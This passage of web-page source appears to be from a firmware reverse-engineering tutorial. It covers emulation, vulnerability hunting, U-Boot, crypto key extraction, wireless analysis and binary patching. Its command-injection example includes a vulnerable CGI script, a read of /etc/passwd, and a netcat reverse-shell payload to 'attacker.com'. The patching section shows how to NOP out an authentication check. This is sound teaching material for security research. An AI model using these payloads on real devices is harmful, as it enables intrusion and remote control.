{`# QEMU User-Mode: Run single binaries from extracted filesystem
# Useful for quick testing without full system emulation

# Install QEMU
$ sudo apt install qemu-user-static

# Check binary architecture
$ file bin/httpd
bin/httpd: ELF 32-bit LSB executable, ARM, EABI5

# Run ARM binary on x86 host
$ qemu-arm-static -L ./squashfs-root ./squashfs-root/bin/busybox
# -L sets the library search path (root of extracted FS)

# Run MIPS binary (big-endian)
$ qemu-mips-static -L ./squashfs-root ./squashfs-root/bin/httpd

# Common issues and fixes:
# "No such file or directory" - Missing interpreter
$ file bin/busybox  # Check for /lib/ld-linux.so.3
$ ln -s squashfs-root/lib/ld-linux.so.3 /lib/

# Environment variables needed by some binaries
$ export LD_LIBRARY_PATH=./squashfs-root/lib

# Debugging with GDB
$ qemu-arm-static -g 1234 -L ./squashfs-root ./bin/httpd &
$ gdb-multiarch ./bin/httpd
(gdb) target remote :1234
(gdb) continue`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#14b8a6" }}>
            Firmadyne Full System Emulation
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Firmadyne - Automated Linux firmware emulation
# Best for routers, APs, NAS devices with Linux

# Setup (one-time)
$ git clone https://github.com/firmadyne/firmadyne
$ cd firmadyne && ./setup.sh

# Extract firmware
$ ./sources/extractor/extractor.py -b vendor -sql 127.0.0.1 \
    -np -nk firmware.bin images

# Identify architecture
$ ./scripts/getArch.sh images/1.tar.gz
# Output: mipseb (MIPS big-endian)

# Load filesystem into database
$ ./scripts/tar2db.py -i 1 -f images/1.tar.gz

# Create QEMU image
$ ./scripts/makeImage.sh 1 mipseb

# Infer network configuration
$ ./scripts/inferNetwork.sh 1

# Run emulation
$ ./scratch/1/run.sh
# Access at inferred IP (e.g., http://192.168.0.1)

# Success rate tips:
# - About 30-40% of firmware emulates successfully
# - Fails often due to hardware dependencies
# - Try FirmAE for better success rate`}
            </Typography>
          </Paper>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Emulation Limitations</AlertTitle>
            <Typography variant="body2">
              Full emulation often fails because firmware expects specific hardware (GPIOs, custom ASICs, 
              proprietary peripherals). When full emulation fails, try: user-mode for individual binaries, 
              hooking hardware calls with Unicorn/QILING, or using the real device with debugging enabled.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 9: VULNERABILITY RESEARCH ==================== */}
        <Paper
          id="vulnerability-research-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#dc2626", 0.02),
            border: `1px solid ${alpha("#dc2626", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#dc2626", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#dc2626",
              }}
            >
              <BugReportIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#dc2626" }}>
                9. Vulnerability Research
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Firmware is notorious for security vulnerabilities due to legacy code, resource constraints, 
            and rushed development cycles. Understanding common vulnerability patterns helps you systematically 
            find security issues in any firmware you analyze.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
            Common Vulnerability Classes
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { vuln: "Command Injection", severity: "Critical", desc: "User input passed to system()/popen()/exec() without sanitization", where: "Web interfaces, CLI handlers, upgrade routines" },
              { vuln: "Buffer Overflow", severity: "Critical", desc: "Fixed-size buffers + unchecked input (strcpy, sprintf, gets)", where: "Network daemons, parsers, authentication" },
              { vuln: "Hardcoded Credentials", severity: "High", desc: "Static passwords, API keys, or certificates in firmware", where: "Config files, binaries, web backends" },
              { vuln: "Authentication Bypass", severity: "Critical", desc: "Missing auth checks, weak session handling, backdoor accounts", where: "Web admin, telnet/SSH, debug interfaces" },
              { vuln: "Path Traversal", severity: "High", desc: "Improper handling of ../ allows file system access", where: "File download/upload, web servers, FTP" },
              { vuln: "Information Disclosure", severity: "Medium", desc: "Debug info, stack traces, config leaks in responses", where: "Error pages, APIs, log files" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#dc2626", 0.03), border: `1px solid ${alpha("#dc2626", 0.1)}` }}>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#dc2626" }}>{item.vuln}</Typography>
                    <Chip 
                      label={item.severity} 
                      size="small" 
                      sx={{ 
                        bgcolor: alpha(item.severity === "Critical" ? "#dc2626" : item.severity === "High" ? "#f97316" : "#f59e0b", 0.15), 
                        color: item.severity === "Critical" ? "#dc2626" : item.severity === "High" ? "#f97316" : "#f59e0b",
                        fontWeight: 600, 
                        fontSize: "0.7rem" 
                      }} 
                    />
                  </Box>
                  <Typography variant="body2" sx={{ mb: 1, fontSize: "0.85rem" }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Look in:</strong> {item.where}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
            Hunting Techniques
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Static Analysis: Searching Extracted Filesystem
# ================================================

# Find hardcoded passwords
$ grep -rni "password" --include="*.conf" --include="*.lua"
$ grep -rni "admin\|root" etc/passwd etc/shadow

# Find command injection sinks in web code
$ grep -rn "system\|exec\|popen\|passthru" www/ usr/lib/lua/
$ grep -rn "\`.*\$" www/  # Backtick command substitution

# Find dangerous C functions in binaries
$ strings bin/httpd | grep -E "strcpy|sprintf|gets|scanf"

# Find hardcoded IPs/URLs (C2, update servers)
$ grep -rnoE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" .
$ strings -a bin/* | grep -E "http://|https://"

# Find encryption keys
$ find . -name "*.pem" -o -name "*.key" -o -name "*.crt"
$ grep -rn "BEGIN.*KEY\|BEGIN CERT" .

# Find debug/backdoor functions
$ strings bin/* | grep -i "debug\|backdoor\|telnet\|shell"

# Binary Analysis: In Ghidra/IDA
# ================================
# Search for dangerous function calls:
# - system(), popen(), execve() - command injection
# - strcpy(), strcat(), sprintf() - buffer overflow
# - strcmp() for password checks (timing attacks)
# Look for authentication routines and trace input flow`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
            Real-World Example: Command Injection
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Vulnerable CGI handler (simplified real example)
# File: www/cgi-bin/diagnostic.cgi

#!/bin/sh
PING_ADDR=$(echo "$QUERY_STRING" | sed 's/.*addr=//' | sed 's/&.*//')
ping -c 4 $PING_ADDR    # <-- No sanitization!

# Exploit:
# Normal: ?addr=192.168.1.1
# Attack: ?addr=192.168.1.1;cat /etc/passwd

# HTTP request:
GET /cgi-bin/diagnostic.cgi?addr=;id HTTP/1.1
Host: 192.168.1.1

# Response reveals command execution:
uid=0(root) gid=0(root)

# Reverse shell payload:
?addr=;nc attacker.com 4444 -e /bin/sh`}
            </Typography>
          </Paper>

          <Alert severity="error" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Legal Warning</AlertTitle>
            <Typography variant="body2">
              Only test vulnerabilities on devices you own or have explicit written permission to test. 
              Unauthorized access to computer systems is illegal. When you find vulnerabilities, practice 
              responsible disclosure—give vendors time to patch before publishing details.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 10: BOOTLOADER ANALYSIS ==================== */}
        <Paper
          id="bootloader-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#6366f1", 0.02),
            border: `1px solid ${alpha("#6366f1", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#6366f1", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#6366f1",
              }}
            >
              <AccountTreeIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#6366f1" }}>
                10. Bootloader Analysis
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            The bootloader is the first code that runs when a device powers on. It initializes hardware, loads the 
            main firmware, and often provides recovery mechanisms. Understanding and accessing the bootloader can 
            unlock powerful capabilities for firmware extraction and modification.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#6366f1" }}>
            Common Bootloaders
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { name: "U-Boot", desc: "Universal Boot Loader - most common in embedded Linux", features: "Environment variables, network boot, scripting, memory access", interrupt: "Press any key or 'tpl' during boot" },
              { name: "CFE", desc: "Common Firmware Environment - Broadcom devices", features: "Flash commands, network boot, JTAG recovery", interrupt: "Ctrl+C during boot countdown" },
              { name: "RedBoot", desc: "Red Hat embedded debug/bootstrap", features: "Flash management, GDB stub, network boot", interrupt: "Ctrl+C during boot" },
              { name: "Barebox", desc: "U-Boot fork with improvements", features: "POSIX-like shell, better scripting", interrupt: "Press key during countdown" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#6366f1", 0.03), border: `1px solid ${alpha("#6366f1", 0.1)}` }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#6366f1", mb: 0.5 }}>{item.name}</Typography>
                  <Typography variant="body2" sx={{ mb: 1, fontSize: "0.85rem" }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary" sx={{ display: "block" }}><strong>Features:</strong> {item.features}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Interrupt:</strong> {item.interrupt}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#6366f1" }}>
            U-Boot Commands (Most Common)
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`U-Boot Essential Commands
=========================

# Get to U-Boot prompt (via UART serial console)
# Power on device, quickly press Enter/Space/any key

# View environment variables
U-Boot> printenv
bootargs=console=ttyS0,115200 root=/dev/mtdblock2
bootcmd=bootm 0x9F050000
ipaddr=192.168.1.1

# Dump flash memory to TFTP server
U-Boot> setenv ipaddr 192.168.1.1
U-Boot> setenv serverip 192.168.1.100
U-Boot> tftpput 0x80000000 0x1000000 firmware_dump.bin
# Transfers 16MB from address 0x80000000

# Memory examination
U-Boot> md 0x9F000000 100    # Display memory (hex)
U-Boot> md.b 0x9F000000 100  # Display as bytes

# Boot process modification
U-Boot> setenv bootargs 'console=ttyS0,115200 single init=/bin/sh'
# Boots to single-user shell

# Network boot (useful for testing)
U-Boot> dhcp
U-Boot> tftpboot 0x80000000 custom_kernel
U-Boot> bootm 0x80000000

# Flash operations
U-Boot> sf probe 0           # Initialize SPI flash
U-Boot> sf read 0x80000000 0 0x100000  # Read to RAM
U-Boot> sf erase 0 0x100000  # Erase (careful!)
U-Boot> sf write 0x80000000 0 0x100000 # Write from RAM

# Save changes
U-Boot> saveenv`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#6366f1" }}>
            Secure Boot & Bypass Techniques
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { tech: "Signature Verification", desc: "Firmware signed with RSA/ECDSA, verified at boot", bypass: "Find signing key, exploit verification bugs, glitching attacks" },
              { tech: "Locked Bootloader", desc: "Boot menu disabled, no environment access", bypass: "JTAG/SWD access, UART hidden pins, voltage glitching" },
              { tech: "Encrypted Firmware", desc: "Firmware encrypted, decrypted at boot", bypass: "Extract key from bootloader, side-channel attacks" },
              { tech: "Secure Fuses", desc: "OTP bits disable debug, enforce secure boot", bypass: "Glitching during fuse read, finding unfused dev units" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#6366f1", 0.03), border: `1px solid ${alpha("#6366f1", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#6366f1", mb: 0.5 }}>{item.tech}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", mb: 0.5 }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Bypass:</strong> {item.bypass}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Bootloader Password Recovery</AlertTitle>
            <Typography variant="body2">
              If the bootloader is password-protected, try: default passwords (admin, password, device model), 
              analyzing the bootloader binary for hardcoded passwords, or using JTAG to dump/modify the password 
              stored in flash. Some U-Boot versions have known vulnerabilities for authentication bypass.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 11: CRYPTOGRAPHIC ANALYSIS ==================== */}
        <Paper
          id="crypto-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#f59e0b", 0.02),
            border: `1px solid ${alpha("#f59e0b", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#f59e0b", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#f59e0b",
              }}
            >
              <LockOpenIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#f59e0b" }}>
                11. Cryptographic Analysis
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Many modern devices use encryption to protect firmware updates, configuration data, and 
            communications. Understanding cryptographic implementations—and their weaknesses—is essential for 
            thorough firmware analysis. Common issues include weak algorithms, hardcoded keys, and improper 
            implementations.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
            Common Crypto in Firmware
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { use: "Firmware Encryption", common: "AES-128/256, XOR (weak), custom (weak)", weakness: "Hardcoded keys, weak custom crypto" },
              { use: "Signature Verification", common: "RSA-2048/4096, ECDSA, SHA256", weakness: "Missing verification, key extraction" },
              { use: "Configuration Protection", common: "AES, DES (weak), Base64 (not crypto!)", weakness: "Static keys, reversible encoding" },
              { use: "Password Storage", common: "MD5 (weak), SHA1 (weak), bcrypt/scrypt", weakness: "Unsalted hashes, weak algorithms" },
              { use: "Network Traffic", common: "TLS/SSL, custom protocols", weakness: "Self-signed certs, outdated TLS" },
              { use: "Boot Verification", common: "SHA256 hash, RSA signature", weakness: "Keys in same flash, glitching" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#f59e0b", 0.03), border: `1px solid ${alpha("#f59e0b", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 0.5 }}>{item.use}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem", mb: 0.5 }}><strong>Algorithms:</strong> {item.common}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Weakness:</strong> {item.weakness}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
            Finding and Extracting Keys
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Key Hunting Techniques
# ======================

# 1. Search for key-like strings in filesystem
$ grep -r "BEGIN.*KEY\|BEGIN CERT" .
$ find . -name "*.pem" -o -name "*.key" -o -name "*.der"

# 2. Search for high-entropy regions (likely encrypted/keys)
$ binwalk -E firmware.bin   # Entropy analysis
# Flat high entropy = encryption or compression
# Spikes = keys or random data

# 3. Search binaries for crypto constants
# AES S-box: 63 7c 77 7b f2 6b 6f c5...
# AES RCON: 01 02 04 08 10 20 40 80...
$ xxd binary | grep -i "637c 777b"

# 4. Dynamic analysis - watch key loading
$ ltrace ./encrypted_updater 2>&1 | grep -i "aes\|key\|crypt"
$ strace ./encrypted_updater 2>&1 | grep -i "open\|read"

# 5. Ghidra crypto identification
# Search → For Strings → "AES", "RSA", "encrypt"
# Search for crypto library functions
# Findcrypt plugin identifies crypto constants

# 6. Hardware key extraction
# - Keys in OTP (one-time programmable) memory
# - Keys derived from device-unique values
# - Side-channel attacks (power analysis, timing)

# Common hardcoded key locations:
# - Bootloader (decryption before main firmware)
# - /etc/ssl/, /etc/certs/
# - Compiled into binaries (search with strings)
# - NVRAM partition`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
            Decrypting Firmware
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Once you have the key/algorithm, decrypt:

# OpenSSL for AES decryption
$ openssl aes-256-cbc -d -in encrypted.bin -out decrypted.bin \
    -K <hex_key> -iv <hex_iv>

# Python for custom crypto
from Crypto.Cipher import AES
import struct

key = bytes.fromhex('0123456789abcdef0123456789abcdef')
iv = bytes.fromhex('00000000000000000000000000000000')

with open('encrypted.bin', 'rb') as f:
    data = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(data)

# Handle XOR "encryption" (common in cheap devices)
def xor_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Identify encryption by examining headers
$ xxd encrypted.bin | head
# Random looking = encrypted
# Recognizable patterns = XOR or weak crypto
# Look for repeating patterns in XOR`}
            </Typography>
          </Paper>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Crypto Red Flags in Firmware</AlertTitle>
            <Typography variant="body2">
              Watch for: XOR with short keys (easily broken), ECB mode (reveals patterns), hardcoded IVs 
              (breaks CBC security), MD5/SHA1 for passwords (rainbow tables), Base64 called "encryption" 
              (it's just encoding!), and custom crypto algorithms (almost always broken).
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 12: WIRELESS PROTOCOLS ==================== */}
        <Paper
          id="wireless-protocols-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#0ea5e9", 0.02),
            border: `1px solid ${alpha("#0ea5e9", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#0ea5e9", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#0ea5e9",
              }}
            >
              <WifiIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#0ea5e9" }}>
                12. Wireless Protocol Analysis
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Many embedded devices communicate wirelessly, and firmware often contains the implementation of these 
            protocols. Analyzing wireless functionality can reveal authentication weaknesses, data exposure, and 
            protocol-level vulnerabilities that wouldn't be visible through other analysis methods.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#0ea5e9" }}>
            Common Wireless Protocols in IoT
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { protocol: "Wi-Fi (802.11)", freq: "2.4/5 GHz", range: "~100m", use: "High bandwidth, IP networking", tools: "Wireshark, aircrack-ng, WiFi Pineapple" },
              { protocol: "Bluetooth/BLE", freq: "2.4 GHz", range: "~100m", use: "Short range, low power devices", tools: "Ubertooth, BTLEJuice, nRF Sniffer" },
              { protocol: "Zigbee (802.15.4)", freq: "2.4 GHz", range: "~100m", use: "Home automation, mesh networks", tools: "KillerBee, ApiMote, Wireshark" },
              { protocol: "Z-Wave", freq: "~900 MHz", range: "~100m", use: "Home automation, proprietary", tools: "HackRF, RTL-SDR, Scapy-radio" },
              { protocol: "LoRa/LoRaWAN", freq: "Sub-GHz", range: "~15km", use: "Long range IoT, sensors", tools: "HackRF, LoStik, ChirpOTLE" },
              { protocol: "Thread/Matter", freq: "2.4 GHz", range: "~100m", use: "Smart home, IPv6 mesh", tools: "Wireshark, Thread sniffer" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#0ea5e9", 0.03), border: `1px solid ${alpha("#0ea5e9", 0.1)}` }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#0ea5e9", mb: 0.5 }}>{item.protocol}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem" }}><strong>Frequency:</strong> {item.freq}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem" }}><strong>Range:</strong> {item.range}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem" }}><strong>Use:</strong> {item.use}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Tools:</strong> {item.tools}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#0ea5e9" }}>
            Analyzing Wireless in Firmware
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Finding Wireless Configuration in Firmware
# ==========================================

# Search for wireless configuration files
$ find . -name "*wireless*" -o -name "*wifi*" -o -name "*wlan*"
$ grep -rn "ssid\|wpa\|psk\|passphrase" etc/

# Common Wi-Fi config locations
etc/config/wireless     # OpenWrt style
etc/wpa_supplicant.conf # Standard Linux
nvram                   # Often stores WiFi creds

# Find hardcoded wireless credentials
$ grep -rn "password\|psk\|key" etc/config/
$ strings nvram | grep -i "wpa\|ssid"

# Bluetooth pairing keys and MACs
$ find . -name "*bluetooth*" -o -name "*bt*"
$ grep -rn "link_key\|pairing" .

# Zigbee network keys (16 bytes, often hardcoded!)
$ strings bin/* | grep -E "^[0-9a-fA-F]{32}$"
$ grep -rn "network.key\|zigbee" .

# Analyze wireless driver binaries
$ strings lib/modules/*/wireless.ko | grep -i "key\|auth"
$ strings bin/wpa_supplicant | grep -i "passphrase"`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#0ea5e9" }}>
            Common Wireless Vulnerabilities
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { vuln: "Hardcoded Network Keys", desc: "Zigbee/Z-Wave network keys compiled into firmware", impact: "Join/control entire network" },
              { vuln: "Weak Pairing", desc: "Predictable or no authentication during setup", impact: "Man-in-the-middle, device takeover" },
              { vuln: "Unencrypted Traffic", desc: "Sensitive data sent in plaintext over wireless", impact: "Data theft, credential exposure" },
              { vuln: "Replay Attacks", desc: "No nonce/sequence numbers in protocol", impact: "Replay commands (unlock door, etc.)" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#0ea5e9", 0.03), border: `1px solid ${alpha("#0ea5e9", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#0ea5e9", mb: 0.5 }}>{item.vuln}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.85rem", mb: 0.5 }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Impact:</strong> {item.impact}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Hardware for Wireless Analysis</AlertTitle>
            <Typography variant="body2">
              For active wireless testing, you'll need specialized hardware: HackRF One (~$300) for wide frequency range, 
              Ubertooth One (~$120) for Bluetooth, Zigbee USB adapters (~$30) with KillerBee, or RTL-SDR (~$25) for 
              passive monitoring. Start with firmware analysis before investing in hardware.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 13: MODIFICATION & PATCHING ==================== */}
        <Paper
          id="modification-patching-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#84cc16", 0.02),
            border: `1px solid ${alpha("#84cc16", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#84cc16", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#84cc16",
              }}
            >
              <BuildIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#84cc16" }}>
                13. Firmware Modification & Patching
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            After analyzing firmware, you may want to modify it—whether to add debugging capabilities, remove 
            restrictions, patch vulnerabilities, or install custom functionality. This section covers the 
            techniques for modifying binaries, rebuilding firmware images, and safely flashing them to devices.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#84cc16" }}>
            Binary Patching Techniques
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Binary Patching Methods
# =======================

# 1. Hex editing (simple byte changes)
$ hexedit binary_file
# or use xxd for scripted patching
$ xxd binary > binary.hex
$ vim binary.hex  # Edit hex values
$ xxd -r binary.hex > binary_patched

# 2. Ghidra patching
# - Navigate to instruction to patch
# - Right-click → Patch Instruction
# - Or: Patch Data for data changes
# - Export: File → Export Program → Binary

# 3. Common patches:
# - NOP out checks: Replace with 0x00 (ARM), 0x90 (x86)
# - Change branch: JZ → JMP, BEQ → B
# - Modify strings: Keep same length or adjust references

# Example: Bypass authentication check
# Before: BNE auth_fail (branch if not equal)
# After:  NOP NOP (always continue)

# ARM NOP: 0x00 0x00 0x00 0x00 (32-bit) or 0x00 0xBF (Thumb)
# MIPS NOP: 0x00 0x00 0x00 0x00
# x86 NOP: 0x90

# Using radare2 for patching
$ r2 -w binary_file
[0x00000000]> s 0x1234    # Seek to address
[0x00001234]> wx 9090     # Write bytes
[0x00001234]> wa nop      # Write assembly
[0x00001234]> wao nop     # Convert instruction to NOP`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#84cc16" }}>
            Rebuilding Firmware Images
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Rebuilding SquashFS Filesystem
# ==============================

# After modifying files in extracted filesystem:
$ mksquashfs squashfs-root new_filesystem.squashfs \\
    -comp xz -b 262144 -no-xattrs

# Check original for compression type:
$ binwalk original_firmware.bin | grep -i squash
# Match compression: xz, gzip, lzma, lzo

# Rebuilding full firmware image:
